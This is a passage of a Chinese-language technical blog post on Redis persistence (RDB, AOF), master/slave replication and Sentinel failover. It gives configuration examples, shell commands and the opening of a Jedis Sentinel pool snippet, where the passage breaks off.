<p>&#x5982;&#x9700;&#x5927;&#x89C4;&#x6A21;&#x6570;&#x636E;&#x6062;&#x590D;&#xFF0C;&#x4E14;&#x5BF9;&#x6570;&#x636E;&#x6062;&#x590D;&#x7684;&#x5B8C;&#x6574;&#x6027;&#x4E0D;&#x654F;&#x611F;&#xFF0C;&#x90A3;&#x4E48; rdb &#x4F1A;&#x6BD4; aof &#x65B9;&#x5F0F;&#x66F4;&#x52A0;&#x9AD8;&#x6548;&#x3002;&#x5176;&#x7F3A;&#x70B9;&#x5C31;&#x662F;&#x6700;&#x540E;&#x4E00;&#x6B21;&#x6301;&#x4E45;&#x5316;&#x7684;&#x6570;&#x636E;&#x53EF;&#x80FD;&#x4E22;&#x5931;&#x3002;</p>
<blockquote>
<p>Fork<br>
In an operating system, a fork is a Unix or Linux system call to create a new process from an existing running process. The new process is a child process of the calling parent process.</p>
</blockquote>
<ul>
<li>SNAPSHOTTING</li>
</ul>
<p>stop-writes-on-bgsave-error =&gt; &#x65E0;&#x6CD5;&#x5199;&#x5165;&#x78C1;&#x76D8;&#x7684;&#x65F6;&#x5019;&#xFF08;&#x78C1;&#x76D8;&#x7A7A;&#x95F4;&#x6EE1;&#x4E86;&#xFF09;&#xFF0C;&#x4E0D;&#x518D;&#x8FDB;&#x884C; redis &#x7684;&#x5199;&#x64CD;&#x4F5C;&#x3002;</p>
<blockquote>
<p>BGSAVE =&gt;<br>
Redis BGSAVE command saves the DB in the background. The OK code is immediately returned. Redis forks, the parent continues to serve the clients, the child saves the DB on the disk, then exits. A client may be able to check if the operation succeeded using the LASTSAVE command.</p>
</blockquote>
<p>rdbcompression =&gt; &#x662F;&#x5426;&#x5BF9;&#x6301;&#x4E45;&#x5316;&#x7684;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x538B;&#x7F29;&#x3002;yes &#x5219;&#x91C7;&#x7528; LZF &#x7B97;&#x6CD5;&#x538B;&#x7F29;&#x3002;</p>
<p>rdbchecksum =&gt; &#x5B58;&#x50A8;&#x5FEB;&#x7167;&#x540E;&#x4EE5; CRC64 Cyclic redundancy check &#x8FDB;&#x884C;&#x6570;&#x636E;&#x6821;&#x9A8C;&#x3002;</p>
<p>save =&gt; &#x8BBE;&#x7F6E;&#x67D0;&#x6BB5;&#x65F6;&#x95F4;&#x5185;&#x5B58;&#x5728;&#x591A;&#x5C11;&#x53D8;&#x5316;&#x5C31;&#x4F1A;&#x8FDB;&#x884C;&#x6301;&#x4E45;&#x5316;&#x64CD;&#x4F5C;&#x3002;</p>
<h3 id="aof-append-of-file">AOF Append Of File</h3>
<p>&#x4EE5;&#x65E5;&#x5FD7;&#x7684;&#x5F62;&#x5F0F;&#x8BB0;&#x5F55;&#x5199;&#x64CD;&#x4F5C;&#xFF08;&#x589E;&#x91CF;&#x4FDD;&#x5B58;&#xFF09;&#xFF0C;&#x5C06;&#x6267;&#x884C;&#x8FC7;&#x7684;&#x6240;&#x6709;&#x5199;&#x6307;&#x4EE4;&#x4FDD;&#x5B58;&#xFF0C;&#x53EA;&#x8BB8;&#x8FFD;&#x52A0;&#x4F46;&#x4E0D;&#x53EF;&#x4EE5;&#x6539;&#x5199;&#x6587;&#x4EF6;&#xFF0C;redis &#x542F;&#x52A8;&#x65F6;&#x4F1A;&#x8BFB;&#x53D6;&#x8BE5;&#x6587;&#x4EF6;&#x5E76;&#x6267;&#x884C;&#x4EE5;&#x91CD;&#x6784;&#x6062;&#x590D;&#x6570;&#x636E;&#x3002;</p>
<ul>
<li>AOF &#x6301;&#x4E45;&#x5316;&#x6D41;&#x7A0B;</li>
</ul>
<p>AOF &#x9ED8;&#x8BA4;&#x4E0D;&#x5F00;&#x542F;&#xFF0C;&#x9700;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BBE;&#x7F6E; appendonly &#x4E3A; yes&#x3002;&#x5176;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x8DEF;&#x5F84;&#x4E0E; RDB &#x4E00;&#x81F4;&#x3002;&#x5F53; AOF &#x4E0E; RDB &#x540C;&#x65F6;&#x5F00;&#x542F;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x9ED8;&#x8BA4;&#x8BFB;&#x53D6;&#x524D;&#x8005;&#x6570;&#x636E;&#xFF08;&#x5B8C;&#x6574;&#x6027;&#xFF09;&#x3002;</p>
<ul>
<li>APPEND ONLY MODE</li>
</ul>
<p>appendonly no =&gt; &#x662F;&#x5426;&#x5728;&#x6BCF;&#x6B21;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#x540E;&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x3002;</p>
<p>appendfilename appendonly.aof =&gt; &#x6307;&#x5B9A;&#x66F4;&#x65B0;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x540D;&#x3002;</p>
<p>appendfsync =&gt; &#x66F4;&#x65B0;&#x65E5;&#x5FD7;&#x6761;&#x4EF6;|&#x540C;&#x6B65;&#x9891;&#x7387;&#x8BBE;&#x7F6E; -&gt; no|fsync|everysec&#x3002;</p>
<ul>
<li>&#x5F02;&#x5E38;&#x6062;&#x590D;</li>
</ul>
<pre><code class="language-shell">/usr/local/bin/redis-check-aof--fix appendonly.aof
</code></pre>
<ul>
<li><a href="https://redis.io/commands/bgrewriteaof/">BGREWRITEAOF</a></li>
</ul>
<p>&#x542F;&#x52A8;&#x91CD;&#x5199;&#x5C06;&#x521B;&#x5EFA;&#x5F53;&#x524D;&#x4EC5;&#x9644;&#x52A0;&#x6587;&#x4EF6;&#x7684;&#x5C0F;&#x578B;&#x4F18;&#x5316;&#x7248;&#x672C;&#x3002;&#x4ECE; Redis 2.4 &#x5F00;&#x59CB;&#xFF0C;AOF &#x91CD;&#x5199;&#x7531; Redis &#x81EA;&#x52A8;&#x89E6;&#x53D1;&#xFF0C;&#x4F46;&#x662F;&#x8BE5; BGREWRITEAOF &#x547D;&#x4EE4;&#x53EF;&#x7528;&#x4E8E;&#x968F;&#x65F6;&#x89E6;&#x53D1;&#x91CD;&#x5199;&#x3002;</p>
<p>no-appendfsync-on-rewrite=yes =&gt; &#x4E0D;&#x5199;&#x5165; aof &#x6587;&#x4EF6;&#x53EA;&#x5199;&#x5165;&#x7F13;&#x5B58;&#x3002;</p>
<p>auto-aof-rewrite-percentage =&gt; &#x8BBE;&#x7F6E;&#x91CD;&#x5199;&#x7684;&#x57FA;&#x51C6;&#x503C;&#xFF0C;&#x6587;&#x4EF6;&#x8FBE;&#x5230; 100% &#x65F6;&#x91CD;&#x5199;&#x3002;</p>
<p>auto-aof-rewrite-min-size =&gt; &#x8BBE;&#x7F6E;&#x91CD;&#x5199;&#x7684;&#x57FA;&#x51C6;&#x503C;&#xFF0C;&#x6587;&#x4EF6;&#x8FBE;&#x5230; 64MB &#x5F00;&#x59CB;&#x91CD;&#x5199;&#x3002;</p>
<p>AOF &#x5F53;&#x524D;&#x5927;&#x5C0F; &gt;= base_size + base_size*100% &#x4E14; &gt;= 64mb &#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5F00;&#x542F;&#x91CD;&#x5199;&#x3002;</p>
<h3 id="%E5%B0%8F%E7%BB%93%E6%AF%94%E8%BE%83">&#x5C0F;&#x7ED3;&#x6BD4;&#x8F83;</h3>
<p>&#x63A8;&#x8350;&#x4E24;&#x4E2A;&#x90FD;&#x542F;&#x7528;&#x3002;&#x82E5;&#x5BF9;&#x6570;&#x636E;&#x4E0D;&#x654F;&#x611F;&#xFF0C;&#x53EF;&#x5355;&#x72EC;&#x7528; RDB&#xFF0C;&#x4F46;&#x4E0D;&#x5EFA;&#x8BAE;&#x5355;&#x72EC;&#x7528; AOF&#x3002;&#x5982;&#x679C;&#x53EA;&#x662F;&#x505A;&#x7EAF;&#x5185;&#x5B58;&#x7F13;&#x5B58;&#xFF0C;&#x53EF;&#x4EE5;&#x90FD;&#x4E0D;&#x7528;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6">&#x4E3B;&#x4ECE;&#x590D;&#x5236;</h2>
<p>&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x5373;&#x4E3B;&#x673A;&#x6570;&#x636E;&#x66F4;&#x65B0;&#x540E;&#x6839;&#x636E;&#x914D;&#x7F6E;&#x548C;&#x7B56;&#x7565;&#xFF0C;&#x81EA;&#x52A8;&#x540C;&#x6B65;&#x5230;&#x4ECE;&#x673A;&#x7684; Master/Slaver &#x673A;&#x5236;&#x3002;Master &#x4EE5;&#x5199;&#x4E3A;&#x4E3B;&#xFF0C;Slave &#x4EE5;&#x8BFB;&#x4E3A;&#x4E3B;&#x3002;&#x901A;&#x8FC7;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#x7684;&#x6269;&#x5C55;&#x4EE5;&#x53CA;&#x5BB9;&#x707E;&#x7684;&#x5FEB;&#x901F;&#x6062;&#x590D;&#x3002;</p>
<h3 id="%E5%BF%AB%E9%80%9F%E9%85%8D%E7%BD%AE">&#x5FEB;&#x901F;&#x914D;&#x7F6E;</h3>
<p>&#x4E3A;&#x542F;&#x52A8;&#x591A;&#x4E2A; redis &#x670D;&#x52A1;&#xFF0C;&#x5C06; redis.conf duplicator &#x5728;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x540E;&#x653E;&#x5165;&#x65B0;&#x5EFA; myredis &#x76EE;&#x5F55;&#xFF0C;&#x7528;&#x4E8E;&#x5E26;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x542F;&#x52A8;&#x3002;daemonize &#x5E94;&#x91C7;&#x7528; yes &#x4EE5;&#x4FDD;&#x8BC1; redis &#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#x3002;</p>
<ul>
<li>&#x901A;&#x7528;&#x914D;&#x7F6E;</li>
</ul>
<pre><code class="language-shell">[centos ~]# /usr/local/bin/redis-server /etc/redis.conf
[centos ~]# mkdir /myredis &amp;&amp; cd /myredis
[centos myredis]# cp /etc/redis.conf /myredis/redis.conf
[centos myredis]# ls
redis.conf
</code></pre>
<pre><code class="language-shell"># /myredis/redis.conf
...
appendonly no # &#x662F;&#x5426;&#x5728;&#x6BCF;&#x6B21;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#x540E;&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55; =&gt; &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x5F02;&#x6B65;&#x7684;&#x628A;&#x6570;&#x636E;&#x5199;&#x5165;&#x78C1;&#x76D8;
</code></pre>
<ul>
<li>redis63Xx.conf &#x72EC;&#x7ACB;&#x914D;&#x7F6E;</li>
</ul>
<pre><code class="language-shell"># redis63XX.conf
include /myredis/redis.conf # &#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;
pidfile /var/run/redis_6379.pid # redis &#x4EE5;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x65B9;&#x5F0F;&#x8FD0;&#x884C;&#x65F6;&#x9ED8;&#x8BA4;&#x628A; pid &#x5199;&#x5165; /var/run/redis[???].pid &#x6587;&#x4EF6;
port 6379
dbfilename dump6379.rdb # &#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x81EA;&#x52A8;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x904D;&#x5386;&#x5E76;&#x5C06;&#x5185;&#x5B58;&#x5FEB;&#x7167;&#x5199;&#x5165; dump.rdb
</code></pre>
<ul>
<li>&#x8FD0;&#x884C;&#x60C5;&#x51B5;&#x67E5;&#x770B;</li>
</ul>
<pre><code class="language-shell">[centos myredis]# redis-server redis6379.conf
[centos myredis]# redis-server redis6380.conf
[centos myredis]# redis-server redis6381.conf
[centos myredis]# ps -ef | grep redis
root     15665     1  0 Jun16 ?        00:01:19 redis-server *:6379
root     25595     1  0 21:24 ?        00:00:00 redis-server *:6380
root     25606     1  0 21:24 ?        00:00:00 redis-server *:6381
root     25706 21513  0 21:25 pts/0    00:00:00 grep --color=auto redis
[centos myredis]# kill -9 15665 25595 25606
</code></pre>
<ul>
<li>&#x65B0;&#x7EC8;&#x7AEF;&#x8FDE;&#x63A5;</li>
</ul>
<pre><code class="language-shell">[centos myredis]# redis-cli -p 6379
[centos myredis]# redis-cli -p 6380
[centos myredis]# redis-cli -p 6381
[centos myredis]# info replication # &#x67E5;&#x770B;&#x590D;&#x5236;&#x5B9E;&#x4F8B;&#x4FE1;&#x606F;
# Replication
role:master
connected_slaves:0
...
</code></pre>
<h3 id="%E4%B8%80%E4%B8%BB%E4%BA%8C%E4%BB%86">&#x4E00;&#x4E3B;&#x4E8C;&#x4EC6;</h3>
<p>&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x540E;&#x91CD;&#x542F;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x518D;&#x4F5C;&#x4E3A;&#x4E3B;&#x4ECE;&#x4E2D;&#x7684;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x800C;&#x662F;&#x72EC;&#x7ACB;&#x4E8E;&#x539F;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x3002;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x540E;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x4ECD;&#x7B49;&#x5F85;&#x4E3B;&#x673A;&#xFF0C;&#x5F85;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x6062;&#x590D;&#x540E;&#x8FD8;&#x662F;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6570;&#x636E;&#x4F9D;&#x65E7;&#x3002;&#x5F53;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x8FDE;&#x63A5;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x5411;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x6570;&#x636E;&#x540C;&#x6B65;&#x7684;&#x6D88;&#x606F;&#x3002;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x63A5;&#x5230;&#x540C;&#x6B65;&#x6D88;&#x606F;&#x540E;&#xFF0C;&#x4F1A;&#x5C06;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x6301;&#x4E45;&#x5316;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x5C06;&#x4EA7;&#x751F;&#x7684; dump.rdb &#x6587;&#x4EF6;&#x53D1;&#x9001;&#x7ED9;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x8BFB;&#x53D6;&#x3002;&#x6BCF;&#x6B21;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x5199;&#x64CD;&#x4F5C;&#x540E;&#xFF0C;&#x90FD;&#x4F1A;&#x548C;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x540C;&#x6B65;&#x3002;</p>
<ul>
<li>&#x5728;&#x4ECE;&#x673A;&#x4E0A;&#x6267;&#x884C; slaveof &#x547D;&#x4EE4;&#xFF0C;&#x8BBE;&#x7F6E;&#x5176;&#x4E3A;&#x6307;&#x5B9A;&#x4E3B;&#x673A;&#x7684;&#x4ECE;&#x673A;</li>
</ul>
<pre><code class="language-shell"># &#x8BBE;&#x7F6E;&#x4E3A;&#x6307;&#x5B9A;&#x4E3B;&#x673A;&#x7684;&#x4ECE;&#x673A; =&gt; slaveof &lt;ip&gt; &lt;port&gt;
127.0.0.1:63xx&gt;# slaveof 127.0.0.1 6379
OK
</code></pre>
<p>&#x7B80;&#x800C;&#x8A00;&#x4E4B;&#xFF0C;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x540E;&#x91CD;&#x542F;&#x518D;&#x4F5C;&#x4E3A;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4ECE;&#x673A;&#xFF0C;&#x90A3;&#x4E48;&#x8FD8;&#x662F;&#x4F1A;&#x62FF;&#x5230;&#x4E3B;&#x673A;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x54EA;&#x6015;&#x5728;&#x5B95;&#x673A;&#x671F;&#x95F4;&#x4E3B;&#x673A;&#x8FDB;&#x884C;&#x4E86;&#x64CD;&#x4F5C;&#x3002;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x540E;&#x4E0D;&#x4F1A;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x593A;&#x53D6;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x4E14;&#x5728;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x6062;&#x590D;&#x540E;&#x6570;&#x636E;&#x4F9D;&#x65E7;&#x4FDD;&#x7559;&#x3002;</p>
<blockquote>
<ol>
<li>&#x4E3B;&#x673A;&#x4E0D;&#x914D;&#x7F6E;&#xFF0C;&#x4ECE;&#x673A;&#x4F7F;&#x7528; slaveof &#x6216; replicaof &#x58F0;&#x660E;&#x6240;&#x5C5E;&#x4E3B;&#x673A;&#x3002;</li>
<li>&#x4E3B;&#x673A;&#x5982;&#x679C;&#x5B95;&#x673A;&#xFF0C;&#x91CD;&#x542F;&#x540E;&#x81EA;&#x52A8;&#x6062;&#x590D;&#x5230;&#x4E4B;&#x524D;&#x7684;&#x8F6C;&#x6001;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x518D;&#x505A;&#x5176;&#x4ED6;&#x4EFB;&#x4F55;&#x4FEE;&#x6539;&#xFF0C;&#x518D;&#x65B0;&#x589E;&#x52A0;&#x6570;&#x636E;&#xFF0C;&#x4ECE;&#x673A;&#x53EF;&#x4EE5;&#x8BFB;&#x5230;&#x6570;&#x636E;&#x3002;</li>
<li>&#x4ECE;&#x673A;&#x5982;&#x679C;&#x5B95;&#x673A;&#xFF0C;&#x518D;&#x6B21;&#x91CD;&#x542F;&#x540E;&#xFF0C;&#x518D;&#x6B21;&#x8BFB;&#x6570;&#x636E;&#xFF0C;&#x8BFB;&#x4E0D;&#x5230;&#x3002;&#x9700;&#x8981;&#x4F7F;&#x7528; slaveof &#x6216; replicaof &#x518D;&#x6B21;&#x58F0;&#x660E;&#x6240;&#x5C5E;&#x4E3B;&#x673A;&#xFF0C;&#x58F0;&#x660E;&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x518D;&#x6B21;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x3002;</li>
<li>&#x4E3B;&#x673A;&#x53EF;&#x5199;&#x53EF;&#x8BFB;&#xFF0C;&#x4ECE;&#x673A;&#x53EA;&#x53EF;&#x4EE5;&#x8BFB;&#xFF0C;&#x4E0D;&#x53EF;&#x4EE5;&#x5199;&#x3002;</li>
<li>&#x4ECE;&#x673A;&#x4F7F;&#x7528; slaveof &#x6216; replicaof &#x58F0;&#x660E;&#x6240;&#x5C5E;&#x4E3B;&#x673A;&#x65F6;&#x4F1A;&#x53D1;&#x9001; sync &#x5230;&#x4E3B;&#x673A;&#xFF0C;&#x83B7;&#x53D6;&#x4E3B;&#x673A;&#x7684; rdb &#x6587;&#x4EF6;&#x5E76;&#x6267;&#x884C;&#xFF0C;&#x4EE5;&#x6B64;&#x5B9E;&#x73B0;&#x6570;&#x636E;&#x540C;&#x6B65;&#x3002;&#x540E;&#x7EED;&#x589E;&#x52A0;&#x6570;&#x636E;&#xFF0C;&#x4F7F;&#x7528;<strong>&#x589E;&#x91CF;&#x590D;&#x5236;</strong>&#x5B8C;&#x6210;&#x540C;&#x6B65;&#x3002;&#x5982;&#x679C;&#x662F;&#x5B95;&#x673A;&#x540E;&#x518D;&#x6B21;&#x58F0;&#x660E;&#x6240;&#x5C5E;&#x4E3B;&#x673A;&#xFF0C;&#x5219;&#x4F7F;&#x7528;<strong>&#x5168;&#x91CF;&#x590D;&#x5236;</strong>&#x5B8C;&#x6210;&#x540C;&#x6B65;&#x3002;</li>
</ol>
</blockquote>
<h3 id="%E8%96%AA%E7%81%AB%E7%9B%B8%E4%BC%A0">&#x85AA;&#x706B;&#x76F8;&#x4F20;</h3>
<p>&#x56E0;&#x4E3A;&#x4ECE;&#x673A;&#x53EF;&#x4EE5;&#x63A5;&#x6536;&#x6765;&#x81EA;&#x5176;&#x4ED6;&#x4ECE;&#x673A;&#x7684;&#x8FDE;&#x63A5;&#x548C;&#x540C;&#x6B65;&#x8BF7;&#x6C42;&#xFF0C;&#x90A3;&#x4E48;&#x524D;&#x4E00;&#x4E2A;&#x4ECE;&#x673A;&#x53EF;&#x4EE5;&#x662F;&#x540E;&#x4E00;&#x4E2A;&#x4ECE;&#x673A;&#x7684;&#x4E3B;&#x673A;&#x3002;&#x85AA;&#x706B;&#x76F8;&#x4F20;&#x8FD9;&#x79CD;&#x6A21;&#x5F0F;&#x53EF;&#x4EE5;&#x6709;&#x6548;&#x51CF;&#x8F7B;&#x4E3B;&#x673A;&#x7684;&#x5199;&#x538B;&#x529B;&#xFF0C;&#x901A;&#x8FC7;&#x53BB;&#x4E2D;&#x5FC3;&#x5316;&#x964D;&#x4F4E;&#x98CE;&#x9669;&#x3002;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x82E5;&#x4E2D;&#x9014;&#x53D8;&#x66F4;&#x8F6C;&#x5411;&#xFF0C;&#x90A3;&#x4E48;&#x4F1A;&#x6E05;&#x9664;&#x6B64;&#x524D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5E76;&#x91CD;&#x65B0;&#x5EFA;&#x7ACB;&#x6700;&#x65B0;&#x7684;&#x62F7;&#x8D1D;&#x3002;&#x98CE;&#x9669;&#x5728;&#x4E8E;&#x4E00;&#x65E6;&#x67D0;&#x4E2A;&#x4ECE;&#x673A;&#x5B95;&#x673A;&#xFF0C;&#x540E;&#x8FB9;&#x7684;&#x4ECE;&#x673A;&#x90FD;&#x6CA1;&#x6CD5;&#x5907;&#x4EFD;&#x3002;&#x4E3B;&#x673A;&#x5B95;&#x673A;&#xFF0C;&#x4ECE;&#x673A;&#x8FD8;&#x662F;&#x4ECE;&#x673A;&#xFF0C;&#x53EA;&#x662F;&#x65E0;&#x6CD5;&#x5199;&#x6570;&#x636E;&#x3002;&#x8FD9;&#x79CD;&#x6A21;&#x5F0F;&#x5E38;&#x89C1;&#x4E8E;&#x9879;&#x76EE;&#x4F53;&#x91CF;&#x7684;&#x589E;&#x52A0;&#xFF0C;&#x9700;&#x8981;&#x6811;&#x72B6;&#x5206;&#x5E03;&#x7684;&#x7BA1;&#x7406;&#x3002;</p>
<h3 id="%E5%8F%8D%E5%AE%A2%E4%B8%BA%E4%B8%BB">&#x53CD;&#x5BA2;&#x4E3A;&#x4E3B;</h3>
<p>&#x53CD;&#x5BA2;&#x4E3A;&#x4E3B;&#x5373;&#x5728;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x540E;&#xFF0C;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x5347;&#x7EA7;&#x4E3A;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5176;&#x540E;&#x7684;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x7528;&#x505A;&#x4EFB;&#x4F55;&#x4FEE;&#x6539;&#x3002;</p>
<pre><code class="language-shell"># &#x4ECE;&#x673A;&#x6062;&#x590D;&#x4E3B;&#x673A;&#x72B6;&#x6001;
slaveof no one
</code></pre>
<h3 id="%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F-sentinel"><a href="https://redis.io/docs/manual/sentinel/">&#x54E8;&#x5175;&#x6A21;&#x5F0F; sentinel</a></h3>
<p>&#x54E8;&#x5175;&#x6A21;&#x5F0F;&#x4F5C;&#x4E3A;&#x53CD;&#x5BA2;&#x4E3A;&#x4E3B;&#x7684;&#x81EA;&#x52A8;&#x7248;&#xFF0C;&#x80FD;&#x591F;&#x5728;&#x540E;&#x53F0;&#x76D1;&#x89C6;&#x4E3B;&#x673A;&#x7684;&#x6545;&#x969C;&#x4E0E;&#x5426;&#xFF0C;&#x5E76;&#x6839;&#x636E;&#x6295;&#x7968;&#x81EA;&#x52A8;&#x7684;&#x5C06;&#x4ECE;&#x673A;&#x8F6C;&#x6362;&#x4E3A;&#x4E3B;&#x673A;&#x3002;&#x5728;&#x539F;&#x4E3B;&#x673A;&#x4ECE;&#x5B95;&#x673A;&#x72B6;&#x6001;&#x6062;&#x590D;&#x540E;&#xFF0C;&#x4F1A;&#x9ED8;&#x8BA4;&#x53D8;&#x6210;&#x65B0;&#x4E3B;&#x673A;&#x7684;&#x4ECE;&#x673A;&#x3002;</p>
<p>&#x65B0;&#x4E3B;&#x673A;&#x4F1A;&#x5728;&#x4E00;&#x4F17;&#x4ECE;&#x4E3B;&#x673A;&#x4E2D;&#x4EA7;&#x751F;&#xFF0C;&#x4ECE;&#x673A;&#x7684;&#x6311;&#x9009;&#x987A;&#x5E8F;&#x662F;&#x6839;&#x636E;&#x4F18;&#x5148;&#x7EA7;&#x9760;&#x524D;&#x3001;&#x504F;&#x79FB;&#x91CF;&#x6700;&#x5927;&#x6216; runid &#x6700;&#x5C0F;&#x7684;&#x6307;&#x6807;&#x6765;&#x8FDB;&#x884C;&#x9009;&#x62E9;&#x3002;</p>
<blockquote>
<p>&#x4F18;&#x5148;&#x7EA7;&#x5728; redis.conf &#x4E2D;&#x9ED8;&#x8BA4;&#x4E3A; slave|replica-priority 100&#xFF0C;&#x503C;&#x8D8A;&#x5C0F;&#x4F18;&#x5148;&#x7EA7;&#x8D8A;&#x9AD8;&#x3002;<br>
&#x504F;&#x79FB;&#x91CF;&#x662F;&#x6307;&#x83B7;&#x5F97;&#x539F;&#x4E3B;&#x673A;&#x6570;&#x636E;&#x6700;&#x5168;&#x7684;&#x3002;<br>
&#x6BCF;&#x4E2A; redis &#x5B9E;&#x4F8B;&#x542F;&#x52A8;&#x540E;&#x90FD;&#x4F1A;&#x968F;&#x673A;&#x751F;&#x6210;&#x4E00;&#x4E2A; 40 &#x4F4D;&#x7684; runid&#x3002;</p>
</blockquote>
<p>&#x54E8;&#x5175;&#x6A21;&#x5F0F;&#x5B58;&#x5728;&#x590D;&#x5236;&#x5EF6;&#x65F6;&#x7684;&#x7F3A;&#x70B9;&#x3002;&#x56E0;&#x6240;&#x6709;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x90FD;&#x662F;&#x5148;&#x5728;&#x4E3B;&#x673A;&#xFF0C;&#x7136;&#x540E;&#x540C;&#x6B65;&#x66F4;&#x65B0;&#x5230;&#x4ECE;&#x673A;&#xFF0C;&#x540C;&#x6B65;&#x8FC7;&#x7A0B;&#x4F1A;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x5EF6;&#x8FDF;&#x3002;&#x5F53;&#x7CFB;&#x7EDF;&#x7E41;&#x5FD9;&#x65F6;&#xFF0C;&#x6216;&#x8005;&#x4ECE;&#x673A;&#x6570;&#x91CF;&#x8F83;&#x5927;&#x65F6;&#xFF0C;&#x5EF6;&#x8FDF;&#x95EE;&#x9898;&#x53EF;&#x80FD;&#x4F1A;&#x66F4;&#x52A0;&#x4E25;&#x91CD;&#x3002;</p>
<ul>
<li>&#x914D;&#x7F6E; sentinel.conf</li>
</ul>
<pre><code class="language-shell"># mymaster =&gt; &#x76D1;&#x63A7;&#x5BF9;&#x8C61;&#x8D77;&#x7684;&#x670D;&#x52A1;&#x5668;&#x540D;
# 1 =&gt; &#x81F3;&#x5C11;&#x6709;&#x4E00;&#x4E2A;&#x54E8;&#x5175;&#x540C;&#x610F;&#x8FC1;&#x79FB;&#x7684;&#x6570;&#x91CF;
sentinel monitor mymaster 127.0.0.1 6379 1
</code></pre>
<ul>
<li>&#x542F;&#x52A8;&#x54E8;&#x5175;</li>
</ul>
<p>&#x54E8;&#x5175;&#x9ED8;&#x8BA4;&#x542F;&#x52A8;&#x5728; 26379 &#x7AEF;&#x53E3;&#xFF0C;&#x5728;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x540E;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x4F1A;&#x6253;&#x5370;&#x64CD;&#x4F5C;&#x65E5;&#x5FD7;&#x5E76;&#x5207;&#x6362;&#x4E1B;&#x673A;&#x4E3A;&#x4E3B;&#x673A;&#x3002;</p>
<pre><code class="language-shell">[centos myredis]# redis-sentinel  /myredis/sentinel.conf
</code></pre>
<pre><code class="language-java">private static JedisSentinelPool jedisSentinelPool=null;
public static  Jedis getJedisFromSentinel(){
    if(jedisSentinelPool==null){
        Set&lt;String&gt; sentinelSet=new HashSet&lt;&gt;();
        sentinelSet.add(&quot;remoteIp:26379&quot;);
        JedisPoolConfig jedisPoolConfig =new JedisPoolConfig();
        jedisPoolConfig.setMaxTotal(10); // &#x6700;&#x5927;&#x53EF;&#x7528;&#x8FDE;&#x63A5;&#x6570;
        jedisPoolConfig.setMaxIdle(5); // &#x6700;&#x5927;&#x95F2;&#x7F6E;&#x8FDE;&#x63A5;&#x6570;
